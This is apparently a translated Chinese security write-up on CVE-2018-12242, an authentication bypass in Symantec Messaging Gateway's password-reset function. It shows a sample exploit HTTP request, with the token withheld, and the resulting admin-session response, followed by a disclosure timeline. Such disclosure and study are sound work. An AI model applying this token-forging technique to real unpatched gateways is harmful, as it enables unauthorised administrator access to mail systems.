***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

**在一些信息安全评估工作中，有时很难清楚地了解目标网络的外围情况，作为不得已的手段，我们可能会对目标网络相关曝露在网的应用服务进行安全测试，这种情形下往往会有所突破，就像我在这里要分享的赛门铁克（Symantec）邮件网关授权绕过漏洞（[CVE-2018-12242](https://nvd.nist.gov/vuln/detail/CVE-2018-12242)）一样。**

![赛门铁克](https://image.3001.net/images/20181018/1539853635_5bc84d434d984.jpg!small)

## 发现漏洞

![软件界面](https://image.3001.net/images/20181018/1539853100_5bc84b2cc69a9.png!small)赛门铁克邮件网关（Symantec
Messaging
Gateway）和大多应用登录界面一样，也存在密码重置功能，当登录尝试失败后，会出现“忘记密码”按钮链接，之后，用户名会被提示输入。这里，赛门铁克邮件网关在创建的密码重置链接中，包含了一个加密令牌（token），保证密码重置须是相应用户，以此来验证密码重置的用户合法身份。

肯定的是，这个令牌是加密的，那么我们如何获得密钥呢？好在之前有一个关于赛门铁克邮件网关中[类似bug的披露](https://seclists.org/fulldisclosure/2017/Aug/28)，安全研究者Philip
Pettersson发现了赛门铁克邮件网关的一个认证绕过漏洞，这其中涉及了用类似方式进行加密的参数，他还分析到了一个硬编码密钥，他是这样描述的：

> 非常好，加密使用的竟然是PBEWithMD5AndDES
> 算法生成的一个静态密码，且简单地储存在其源代码中，但我不会在此透露该加密密码或完整的加密通知字符串。

## 漏洞测试

回到我们的测试中来。实际上，在赛门铁克邮件网关的安装过程中，这个密码key都是静态的，在此我们也不会公布这个密码信息。在这种加密机制下，如果攻击者发起加密令牌（token）中形如“admin:”的加密，并把它传递给下述GET参数
“authorization”， 那么，他就会收到一个有效的管理员会话。以下为相应的GET请求示例：

    
    
    GET /brightmail/action2.do?method=passwordReset&authorization=<..>%3d HTTP/1.1
    
    Host: 192.168.17.15
    
    Connection: close
    
    Cache-Control: max-age=0
    
    Origin: <https://192.168.17.15>
    
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: en-US,en;q=0.9

赛门铁克网关的响应如下：

    
    
    HTTP/1.1 302 Found
    
    Server: Apache-Coyote/1.1
    
    Cache-Control: no-store,no-cache
    
    Pragma: no-cache
    
    Expires: Thu, 01 Jan 1970 00:00:00 GMT
    
    X-Frame-Options: SAMEORIGIN
    
    Set-Cookie: JSESSIONID=97B8786DB8CC163EB2A4C595D1028E1D; Path=/brightmail; Secure; HttpOnly
    
    Location: /brightmail/viewWelcome.do?userID=1
    
    Content-Type: text/html;charset=UTF-8
    
    Content-Length: 0
    
    Connection: close

在Brup中的请求和响应如下所示：

![请求和响应](https://image.3001.net/images/20181018/1539853418_5bc84c6aafe62.png!small)当然，其中生成的Cookie消息就是一个有效的管理员会话：

##
![有效的管理员会话](https://image.3001.net/images/20181018/1539853461_5bc84c957d102.png!small)总结

这个漏洞利用的前提是，需要赛门铁克邮件网关开启了密码重置功能。

> 漏洞危害程度为：高
>
> 利用场景：远程
>
> CVSS得分：7.1
>
> 影响版本：赛门铁克邮件网关10.6.6之前的所有版本
>
> 2018.7.11 上报漏洞
>
> 2018.7.11 分类漏洞
>
> 2018.9.12 修复漏洞，发布安全公告和补丁

 ***参考来源：[artkond](https://artkond.com/2018/10/10/symantec-authentication-bypass/)，clouds编译，转载请注明来自FreeBuf.COM**  

